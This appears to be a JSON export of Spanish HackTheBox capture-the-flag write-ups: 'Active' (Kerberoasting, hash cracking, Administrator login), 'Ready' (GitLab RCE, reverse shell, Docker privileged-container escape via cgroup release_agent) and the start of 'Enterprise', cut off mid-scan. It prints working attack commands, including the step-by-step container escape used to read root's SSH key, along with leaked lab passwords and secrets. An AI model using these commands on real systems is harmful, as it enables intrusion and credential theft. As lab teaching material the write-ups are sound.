----------active/CIFS:445    Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 14:06:40. 351723 2021-01-21 11:07:03. 723783[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)Inicialmente vemos que el usuario SVC_TGS es administrador aparentemente del servicio SMB (Puerto 445), perfecto, por un lado tamos felices, pero por el otro vemos un error :( [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)Con lo que debe ser un error de sincronizaci√≥n o algo por el estilo‚Ä¶ Buscando el error en internet encontramos esta respuesta en el foro askubuntu:  sudo apt install ntpdatentpdate domaincontroller. yourdomain. com Pa leer: Ac√° tambien encontramos la soluci√≥n al error. Leyendo entendemos que el problema es que nosotros como clientes no estamos sincronizados con el servidor kerberos, por eso tamos K. O, pero apoy√°ndonos de ntpdate podemos indicarle que nos haga ese favor, probemos: „Çù ntpdate 10. 10. 10. 10013 May 23:24:25 ntpdate[267388]: adjust time server 10. 10. 10. 100 offset +0. 048002 secY volvemos a validar: „Çù GetUserSPNs. py active. htb/SVC_TGS:GPPstillStandingStrong2k18 -requestImpacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth CorporationServicePrincipalName Name      MemberOf                         PasswordLastSet       LastLogon          Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ----------active/CIFS:445    Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 14:06:40. 351723 2021-01-21 11:07:03. 723783       $krb5tgs$23$*Administrator$ACTIVE. HTB$active. htb/Administrator*$1e8922f5b27692b73e8d64c82e667ee3$cabea62f8331d74174f9a337ca68e1561f1e7060fe661c4e094c31a95e56993ddba0968faeb292a6f8ad99e4844fd30a323b9a9adb9888d61bb7b4e665c3dfa3c345ba2259eae481a1e569b3982711a6ceace7b0ef20f18288fad8f43595f2ca56edcc9eb86979a3f33890d7e9f8d6caeb9267fa410171378f59b316cc0ddd89079ae1e3e48c171630a4f45b7b7c0b449f1f3c6878ca31d94c664bb8f47f9706eb0e316cabdd86aaf0568d7f8ec8de5fc6cc1760c5372412812528f304b3a3345c5a122d3e5e5f817b307c8ffe0b54d75ef2fb0e7b46882632e427bd4a699887c982171465238d05f76b19efb8b2616f7c80e3907cfee77d673e11c1161c0c142e79479a034a0d1b7aeb164fa945363f9d3825ac4da71bda2527efd321f2773d613d13dd0e20bbc88ad49bc64c7572c40546bdbc55350cf3fec0ffb6ff9633e5eed99395b454b15fd1f329313ef4e21f13372e48d395dbeef7b4888f136232d17915c0ed0175a1bd97f5715a2473408bdf53170b59d0744ab8c3554b93595a2cd8726b69f31ca8a75f501f70a810d83e70dace0e8f6409fa4b8579000d352b0a55ebecc528b232367980a753c5a0e7dd4cfed288aa2da2c16332899fe4ee866c5d62ce28a2285d1e5f6fb98964ee2e105ddbeae3c0d5c0b50531ae42d61572995d971c2198ab38897e9d69defd62935f7eda31eea7f87ad921a8f67c4aac069c06ab7b39f947260db380bb9e02a644fba7c8d8e2abd60380d742ac3f6578e40256fc880017ac9b1309716ea4000872abc9f84ce5ec615d4366fff5800b3b3d921652ff9e4ecd3de2bf13438e89604af38ac9a796cc7c728ac7527c77dfdc414ceb7ffa06912fd7cc85d83ba82fdd988ff2defde5b029731c28c431daf60a176b9d618c55b957c5414b5ff03c287fc4595cc7171a13f894010888da18b315cb9c8a1c3b7c50ab32129239cf8c08312cc5e0a4d82f9a2caf9146d17da9128d213bae4212b4814f28a5052c892a52c30d5b890312a552a87c2870b768217fc5b547883c36b2e80d2c5fd6be140ee54f0b9c092eb739df0f3c9a445aa78d0073e9f95c31b2b9990b219db46b7f4050184798e28ec4e2583ff7ae1deb83b5ee62b903d792137a8909e3f84b64abb9288abfc7e4a999fbb419bd765c85c550e14dfc8bf8462aee29504c4a2ac78aa353c580b1c1463b2e1ba214fb70b3ef351448bcd3acfb4a1fd115ca4726fd767ed13a13b0a7a284101b541744402fPerfecto, ahora si se genera el ticket, intentemos crackearlo. Tomamos todo el Ticket, lo pegamos en un archivo (o con el propio GetUserSPNs. py pas√°ndole el argumento -outputfile &lt;file_name&gt;) y haciendo uso de john podemos indicarle: „Çù john --wordlist=/usr/share/wordlists/rockyou. txt --format=krb5tgs hash. SPN Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Press 'q' or Ctrl-C to abort, almost any other key for statusTicketmaster1968 (?)1g 0:00:00:24 DONE (2021-05-13 23:24) 0. 04091g/s 431148p/s 431148c/s 431148C/s Tickle7. . TiborUse the  --show  option to display all of the cracked passwords reliablySession completedObtenemos como contrase√±a en texto plano: Ticketmaster1968. Por lo cual, podr√≠amos probarla contra el usuario Administrator del sistema a ver si conseguimos algo :P Validamos que las credenciales sean funcionales y sobre todo que sean poderosas: „Çù crackmapexec smb 10. 10. 10. 100 -u 'Administrator' -p 'Ticketmaster1968'SMB     10. 10. 10. 100  445  DC        [*] Windows 6. 1 Build 7601 x64 (name:DC) (domain:active. htb) (signing:True) (SMBv1:False)SMB     10. 10. 10. 100  445  DC        [+] active. htb\Administrator:Ticketmaster1968 (Pwn3d!)Lindo, vemos que son v√°lidas, pero sobre todo vemos algo que dice ‚ÄúPwn3d‚Äù, esto nos indica que somos los duros del sistema con estas credenciales, o sea, podemos hacer de todo ;) ‚Ä¶ Obtenci√≥n terminal con el usuario Administrator: Usaremos dos herramientas: ¬¨ wmiexecPodemos apoyarnos de la herramienta wmiexec (del conjunto impacket) para entablarnos una terminal en una m√°quina, ya sea con credenciales o en caso de contar con hashes tambi√©n podr√≠amos: LISTONEEEEEEEEEEEES, ya podr√≠amos interactuar a full con el DC. ¬¨ psexecPodemos aprovechar la ocasi√≥n para probar la herramienta psexec que tambi√©n nos permite ejecutar comandos, us√©mosla para obtener una terminal: Y tambi√©n obtenemos una cmd :) Solo nos quedar√≠a ver las flags: ‚Ä¶ Esto es todo por esta m√°quina, muy entretenida, mi primer recorrido por un DC, hab√≠a hecho la m√°quina Sauna, pero no la documente y muuuuy pocas cosas me acordaba de ella, as√≠ que esta me sirvi√≥ como nuevo punto de partida para estas m√°quinas que se pueden volver muy locas y dif√≠ciles, pero a la vez divertidas (: Y nada, a seguir rompiendo todo! Nos leeremos luego &lt;3 "
    }, {
    "id": 50,
    "url": "http://localhost:4000/htb/ready",
    "title": "HackTheBox - Ready",
    "body": "2021/05/14 - M√°quina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (Gitlab), encontraremos contrase√±as volando y tendremos que escapar de la ballena (Docker) :O TL;DR (Spanish writeup): Creada por: bertolis. Este writeup lo hice despues de haber resuelto la m√°quina, por lo tanto (quiz√°s) ir√© muy directo :P Clasificaci√≥n de la m√°quina: Tiene vulnerabilidades bastante comunes.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Empezamos realizando un escaneo de puertos para saber que servicios est√° corriendo la m√°quina: ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 220 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Jan 6 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 220# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 220 ()  Status: UpHost: 10. 10. 10. 220 ()  Ports: 22/open/tcp//ssh///, 5080/open/tcp//onscreen///# Nmap done at Wed Jan 6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 89. 87 secondsTenemos los siguientes servicios activos:       Puerto   Descripci√≥n         22   SSH: Conexi√≥n remota segura mediante una Shell       5080   Un puerto con poca informaci√≥n, veamos si en el siguiente escaneo conseguimos algo m√°s   Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,5080 -sC -sV 10. 10. 10. 220 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan# Nmap 7. 80 scan initiated Wed Jan 6 25:25:25 2021 as: nmap -p 22,5080 -sC -sV -oN portScan 10. 10. 10. 220Nmap scan report for 10. 10. 10. 220Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)5080/tcp open http  nginx| http-robots. txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \xC2\xB7 GitLab|_Requested resource was http://10. 10. 10. 220:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jan 6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27. 78 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4       5080   HTTP   nginx (Ahora si tenemos data :P)   Pues empecemos a enumerar los servicios (: ‚Ä¶ Puerto 5080 ‚åñ: Ingresamos en la web: 10. 10. 10. 220:5080 y obtenemos: Interesante, tenemos el servicio GitLab, que nos sirve para gestionar repositorios, controlar versiones de proyectos y mantener software desarrollado colaborativamente. Podemos crearnos una cuenta e ingresar al sistema, intent√©moslo:  about. gitlab. comCreamos la cuenta y si todo est√° bien, nos redirige al dashboard de proyectos: Nice, jmmm, pues veamos que podemos encontrar‚Ä¶ Despues de algo de jugueteo, encontramos la versi√≥n de GitLab en el apartado /help:  GitLab 11. 4. 7. Perfecto, ahora tenemos algo en lo que enfocarnos, pues a buscar si existen exploits para esa versi√≥n o que podemos intentar hacer con ella (: ‚Ä¶ Explotaci√≥n #: Despues de un rato probando, me encontr√© este repositorio:  https://github. com/dotPY-hax/gitlab_RCE. En el cual recopila algunos CVE‚Äôs con los cuales se logra ejecuci√≥n remota en la m√°quina afectada, explotando as√≠ un SSRF (que b√°sicamente es manipular un servidor, a tal punto de contar con informaci√≥n con la cual no deber√≠amos contar :P) que junt√°ndolo con un CSRF injection (que nos permite jugar con los submit entre aplicaciones) hacia el protocolo git:// lograr Remote Command Execution (RCE): Revisando el c√≥digo debemos cambiar el puerto al que queramos hacer la reverse Shell. Nos ponemos en escucha primero: ‚Äì¬ª nc -lvp 4433listening on [any] 4433 . . . Ahora ejecutamos: ‚Äì¬ª python3 gitlab_rce. py usage: gitlab_rce. py &lt;http://gitlab:port&gt; &lt;local-ip&gt;‚Äì¬ª python3 gitlab_rce. py http://10. 10. 10. 220:5080 10. 10. 14. 159Gitlab Exploit by dotPY [LOL]registering kDf551GgUn:VutawCPqGC - 200Getting version of http://10. 10. 10. 220:5080 - 200The Version seems to be 11. 4. 7! Choose wiselydelete user kDf551GgUn - 200[0] - GitlabRCE1147 - RCE for Version &lt;=11. 4. 7[1] - GitlabRCE1281LFIUser - LFI for version 10. 4-12. 8. 1 and maybe more[2] - GitlabRCE1281RCE - RCE for version 12. 4. 0-12. 8. 1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIPtype a number and hit enter to choose exploit: Damos a la opci√≥n 0, ya que es nuestra versi√≥n yyyyyyyyy: Tenemos una Shell como el usuario git en el sistema. Antes de seguir hag√°mosle un tratamiento a la Shell (TTY), ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer CTRL + C y dem√°s cosas que podemos hacer en una sesi√≥n completa:  Youtube - S4vitar explicando como hacer tratamiento de la TTY. Listosss, ahora a enumerar‚Ä¶ El archivo user. txt puede ser visualizado con el usuario git, aunque su propietario es dude :O ‚Ä¶ Escalada de privilegios #: En la ra√≠z hay un objeto llamativo (cu√°l es? e. e) pero pues solo es eso, llamativo, ya que esa ‚Äúpass‚Äù no nos sirve con ning√∫n usuario: git@gitlab:/home/dude$ ls /RELEASE assets bin boot dev etc home lib lib64 media mnt opt proc root root_pass run sbin srv sys tmp usr vargit@gitlab:/home/dude$ cat /root_pass YG65407Bjqvv9A0a8Tm_7wDespues de un rato enumerando y no revisar lo basico :l encontramos esta carpeta: git@gitlab:~$ ls -la /opt/total 24drwxr-xr-x 1 root root 4096 Dec 1 16:23 . drwxr-xr-x 1 root root 4096 Jan 24 23:19 . . drwxr-xr-x 2 root root 4096 Dec 7 09:25 backupdrwxr-xr-x 1 root root 4096 Dec 1 12:41 gitlabgit@gitlab:~$ ls -la /opt/backup/total 112drwxr-xr-x 2 root root 4096 Dec 7 09:25 . drwxr-xr-x 1 root root 4096 Dec 1 16:23 . . -rw-r--r-- 1 root root  872 Dec 7 09:25 docker-compose. yml-rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets. json-rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab. rbgit@gitlab:~$Revisando cada archivo tenemos curiosidades: ¬¨ docker-compose. yml: git@gitlab:/opt/backup$ cat docker-compose. ymlversion: '2. 4'services: web:  image: 'gitlab/gitlab-ce:11. 4. 7-ce. 0'  restart: always  hostname: 'gitlab. example. com'  environment:   GITLAB_OMNIBUS_CONFIG: |    external_url 'http://172. 19. 0. 2'    redis['bind']='127. 0. 0. 1'    redis['port']=6379    gitlab_rails['initial_root_password']=File. read('/root_pass')  networks:   gitlab:    ipv4_address: 172. 19. 0. 2  ports:   - '5080:80'   #- '127. 0. 0. 1:5080:80'   #- '127. 0. 0. 1:50443:443'   #- '127. 0. 0. 1:5022:22'  volumes:   - '. /srv/gitlab/config:/etc/gitlab'   - '. /srv/gitlab/logs:/var/log/gitlab'   - '. /srv/gitlab/data:/var/opt/gitlab'   - '. /root_pass:/root_pass'  privileged: true  restart: unless-stopped  #mem_limit: 1024mnetworks: gitlab:  driver: bridge  ipam:   config:    - subnet: 172. 19. 0. 0/16 Tenemos el archivo root_pass, que est√° siendo usado para la ejecuci√≥n de GitLab.  El puerto 5080 debe estar haciendo alg√∫n tipo de Forwarding sobre el 80.  Monturas, donde i. e: . /srv/gitlab/config esta sobre la ruta /etc/gitlab. Y as√≠ con las dem√°s.  Ah y que al tener el archivo docker-compose. yml sabemos que estamos dentro de un contenedor. ¬¨ gitlab-secrets. json: git@gitlab:/opt/backup$ cat gitlab-secrets. json{   gitlab_workhorse :{    secret_token : /HvvEvI/T33qyvK1U4jmnfH7fGxzySlzuhewkOR9Zk0=   },   gitlab_shell :{    secret_token : bad62f769ebf4f96f0114e406fa4605eb25cffd8b629bcff8419bb9078df53b42a219186a19d889a2dfb4f10eb65e6cdc3d784cf70f07c3c29947fc6f1523c14   },   gitlab_rails :{    secret_key_base : b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353 ,    db_key_base : eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429 ,    otp_key_base : b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56 ,    openid_connect_signing_key : \ -----BEGIN RSA PRIVATE KEY-----\nMIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC\ndQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw\nBEtKoBs3nodnosLdyD0+gWl5OHO8MSghGLj/IrAuZzYPXQ7mlEgZXVPezJvYyUZ3\\. . .     . . . En internet dice que es un archivo para restaurar el sistema en caso tal o. o ¬¨ gitlab. rb: git@gitlab:/opt/backup$ cat gitlab. rb## GitLab configuration settings##! This file is generated during initial installation and **is not** modified##! during upgrades. . . . Un archivo con muchos comentarios (: si se los quitamos nos encontramos: git@gitlab:/opt/backup$ cat gitlab. rb | grep -vE  ^#  | uniq -ugitlab_rails['smtp_password'] =  wW59U!ZKMbG9+*#h  Con -E le ingresamos la expresion regular, para que tome todo lo que inicie con #. Y con -v le indicamos que nos borre ese output. Tenemos una contrase√±a, intentemos probar con los usuarios: git@gitlab:/opt/backup$ su dudePassword: su: Authentication failuregit@gitlab:/opt/backup$ su rootPassword: root@gitlab:/opt/backup# iduid=0(root) gid=0(root) groups=0(root)root@gitlab:/opt/backup#Opa, somos usuario administrador del sistema :) Ahora solo nos quedar√≠a ver las flags: root@gitlab:~# ls -latotal 24drwx------ 1 root root 4096 Jan 24 22:37 . drwxr-xr-x 1 root root 4096 Jan 24 23:19 . . lrwxrwxrwx 1 root root  9 Dec 7 16:56 . bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3106 Oct 22 2015 . bashrc-rw-r--r-- 1 root root 148 Aug 17 2015 . profiledrwx------ 2 root root 4096 Dec 7 16:49 . ssh-rw------- 1 root root 2136 Jan 24 22:37 . viminforoot@gitlab:~# pwd/rootroot@gitlab:~# Ehhh? Pues no esta y no, no es error de la m√°quina. Ac√° estuve un rato atascado (buen rato) enumerando‚Ä¶ Me fui para el foro y lo primero que vi fue  Escape! . Relacionando las cosas entend√≠ que al estar en un contenedor, deb√≠a buscar una manera de moverme (‚Äúescapar‚Äù) al host. Este art√≠culo explica muy bien como es el proceso, vamos a repasarlo:  Are containers that are run with the --privileged flag. Unlike regular containers, these containers have root privilege to the host machine. Vickie Li Pues si, a veces necesario (pero siempre peligroso) para cumplir algunas tareas. Pero bueno, primero debemos saber si estamos sobre un contenedor explotable :P Para saberlo nos apoyamos del feature en Linux que a√≠sla el uso de recursos (que en nuestro caso Docker lo usa para asilar sus contenedores), llamado cgroup (control groups) ubicado en proc/1/cgroup: root@gitlab:~# cat /proc/1/cgroup12:freezer:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d11:blkio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d10:cpuset:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d9:devices:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d8:memory:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d7:cpu,cpuacct:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d6:perf_event:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d5:rdma:/4:net_cls,net_prio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d3:hugetlb:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d2:pids:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d1:name=systemd:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d0::/system. slice/containerd. serviceEl art√≠culo nos dice que si estamos dentro de un contenedor debemos ver /docker/ID_del_contenedor. As√≠ que vamos bien (: Ahora, ¬øc√≥mo sabemos si tiene el atributo --privileged?: lo explica, pero no pude probarlo, ya que el comando no est√° habilitado :P Peeero vamos a creer que si lo tenemos activado (pensamiento lateral e. e)‚Ä¶ Escapemos:  Understanding Docker Container Escapes - trailofbits. com. Creamos un cgroup: root@gitlab:~# mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/xHabilitamos el feature (release_agent) que est√° siendo ejecutado desde el host como root:  release_agent: the path to use for release notifications (this file exists in the top cgroup only) kernel. org/cgroups root@gitlab:~# echo 1 &gt; /tmp/cgrp/x/notify_on_releaseAhora alojamos la ruta del archivo que tendr√° nuestros comandos hacia el archivo conteniendo el feature: root@gitlab:~# host_path=`sed -n 's/. *\perdir=\([^,]*\). */\1/p' /etc/mtab`root@gitlab:~# echo $host_path/var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diffroot@gitlab:~# echo  $host_path/cmd  &gt; /tmp/cgrp/release_agentTerminando, a√±adimos nuestros comandos al archivo, donde /cmd son los comandos y /output la respuesta: root@gitlab:~# echo '#!/bin/sh' &gt; /cmdroot@gitlab:~# echo  ls -la /root &gt; $host_path/output  &gt;&gt; /cmdroot@gitlab:~# chmod a+x /cmdEn mi caso quiero listar el directorio home de root. Finalmente ejecutamos un proceso que termina sobre el cgroup que hemos creado y nuestro release_agent es lanzado: root@gitlab:~# sh -c  echo \$\$ &gt; /tmp/cgrp/x/cgroup. procs Veamos el resultado en el archivo /output: root@gitlab:/# cat cmd #!/bin/shls -la /root &gt; /var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff/outputroot@gitlab:/# cat output total 60drwx------ 10 root root 4096 Dec 7 17:02 . drwxr-xr-x 20 root root 4096 Dec 7 17:44 . . lrwxrwxrwx 1 root root  9 Jul 11 2020 . bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 . bashrcdrwx------ 2 root root 4096 May 7 2020 . cachedrwx------ 3 root root 4096 Jul 11 2020 . config-rw-r--r-- 1 root root  44 Jul 8 2020 . gitconfigdrwxr-xr-x 3 root root 4096 May 7 2020 . locallrwxrwxrwx 1 root root  9 Dec 7 17:02 . mysql_history -&gt; /dev/null-rw-r--r-- 1 root root 161 Dec 5 2019 . profile-rw-r--r-- 1 root root  75 Jul 12 2020 . selected_editordrwx------ 2 root root 4096 Dec 7 16:49 . sshdrwxr-xr-x 2 root root 4096 Dec 1 12:28 . vimlrwxrwxrwx 1 root root  9 Dec 7 17:02 . viminfo -&gt; /dev/nulldrwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlabdrwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel-r-------- 1 root root  33 Jul 8 2020 root. txtdrwxr-xr-x 3 root root 4096 May 18 2020 snaproot@gitlab:/# Perfecto, perfectisimo‚Ä¶ Pues hagamos lo mismo, pero extraigamos la llave privada SSH (id_rsa) del usuario root (bueno, si es que existe), para as√≠ entrar sin necesitar contrase√±a: . . . . . . root@gitlab:~# echo '#!/bin/sh' &gt; /cmdroot@gitlab:~# echo  cat /root/. ssh/id_rsa &gt; $host_path/output  &gt;&gt; /cmdroot@gitlab:~# chmod a+x /cmd. . . . . . Y el resultado: Ahora guard√©mosla en un archivo, le damos los permisos necesarios (chmod 600 keyroot) y entremos :O ‚Äì¬ª ssh root@10. 10. 10. 220 -i keyroot Ta nice eh!! Bueno, solo nos quedar√≠a ver las flags:  ‚Ä¶ Final de la m√°quina neas :P En general me gusto, el tema de Docker est√° superinteresante y loco. ¬°Nos charlamos en otro set de ideas y bueno, a seguir rompiendo todo!! ‚ù§Ô∏èüñ§ "
    }, {
    "id": 51,
    "url": "http://localhost:4000/htb/enterprise",
    "title": "HackTheBox - Enterprise",
    "body": "2021/05/10 - M√°quina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e. e Pivotearemos entre contenedores y compartiremos experiencias con el host‚Ä¶ Finalmente explotaremos un buffer overflow mediante un ret2libc para obtener una /bin/sh en el host como root.  TL;DR (Spanish writeup): Creada por: MinatoTW. Bueno, una locura esta vaina‚Ä¶ Nos enfrentaremos a cositas web, en el puerto 443 encontraremos un archivo . zip, lo usaremos para encontrar un plugin vulnerable a inyecci√≥n SQL, jugaremos demasiado con explotaci√≥n manual, crearemos un script para extraer todas las bases de datos, tablas, columnas y data relacionada con ellas‚Ä¶ Enumerando las tablas encontraremos usuarios, contrase√±as (encriptadas y en texto plano) y un post oculto de WordPress con contrase√±as, relacionando los puertos 80 (WordPress) y 8080 (Joomla) lograremos pasar los paneles login con credenciales v√°lidas. Por parte de WordPress usaremos los plugins instalados para modificar su c√≥digo PHP y entablarnos una reverse Shell. Haremos pr√°cticamente lo mismo en Joomla para obtener una reverse Shell. Los dos servicios est√°n corriendo en contenedores Docker. Dando vueltas nos daremos cuenta de que el contenedor que mantiene el servicio Joomla tiene una carpeta compartida con la m√°quina host, la carpeta compartida es la que encontramos en el puerto 443 (donde est√° el archivo comprimido), as√≠ que usaremos esto para crear un archivo . php (para que sea interpretado por la web) donde le indiquemos que nos genere una reverse Shell, en este caso obtendr√≠amos una Shell en el servidor host enterprise. htb como el usuario www-data. Finalmente jugaremos con un servicio (tambi√©n relacionado con el plugin que explotamos inicialmente), que nos daremos cuenta de que realmente es un binario ejecut√°ndose en un puerto externo (32182), jugando con el binario veremos que en un punto se genera una sobrescritura de la memoria, por lo que escribimos partes que realmente no deber√≠amos escribir (Segmentation Fault), explotaremos este Buffer Overflow mediante la t√©cnica llamada ret2libc para indicarle al servicio que nos genere una sh (Shell) como el usuario que ejecuta el proceso, en este caso como el usuario root. Estos son los scripts finales, en el post veremos la creaci√≥n de ellos :)  Script SQLi - extraemos tablas, columnas y data de cualquier base de datos.  Script RCE en los contenedores o en el host.  Script explotando Buffer Overflow. ‚Ä¶ Clasificaci√≥n de la m√°quina: Bastante enumeraci√≥n y a la vez bastante real, disfrutemos.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ al toke my rei, se viene muuuuuuuuuuuuuuuuucho pa leer.  Enumeraci√≥n.  Explotaci√≥n.  Movimiento lateral www-data (docker) -&gt; www-data (host).  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Listones, entonces empezemos validando que serviciones esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 61 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Tue May 4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 61# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 61 ()  Status: UpHost: 10. 10. 10. 61 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///, 8080/open/tcp//http-proxy///, 32812/open/tcp/////# Nmap done at Tue May 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 195. 06 secondsTenemos estos servicios corriendo en estos puertos:       Puerto   Descripci√≥n         22   SSH       80   HTTP       443   HTTPS       8080   HTTP Proxy       32812   Desconocido   Oko, ahora que tenemos conocimiento de los puertos abiertos y m√°s o menos que contienen, apoy√©monos de nuevo de nmap para hacer un escaneo de scripts conocidos y adem√°s identificar las versiones de cada servicio: ~(Para copiar los puertos directamente en la clipboard, hacemos uso de la funci√≥n referenciada antes ‚ù≠ extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 61  [*] Open ports: 22,80,443,8080,32812[*] Ports copied to clipboard)~ ‚ù≠ nmap -p 22,80,443,8080,32812 -sC -sV 10. 10. 10. 61 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   # Nmap 7. 80 scan initiated Tue May 4 25:25:25 2021 as: nmap -p 22,80,443,8080,32812 -sC -sV -oN portScan 10. 10. 10. 61Nmap scan report for 10. 10. 10. 61Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 4p1 Ubuntu 10 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)|  256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)|_ 256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)80/tcp  open http   Apache httpd 2. 4. 10 ((Debian))|_http-generator: WordPress 4. 8. 1|_http-server-header: Apache/2. 4. 10 (Debian)|_http-title: USS Enterprise &amp;#8211; Ships Log443/tcp  open ssl/http Apache httpd 2. 4. 25 ((Ubuntu))|_http-server-header: Apache/2. 4. 25 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works| ssl-cert: Subject: commonName=enterprise. local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK| Not valid before: 2017-08-25T10:35:14|_Not valid after: 2017-09-24T10:35:14|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1. 18080/tcp open http   Apache httpd 2. 4. 10 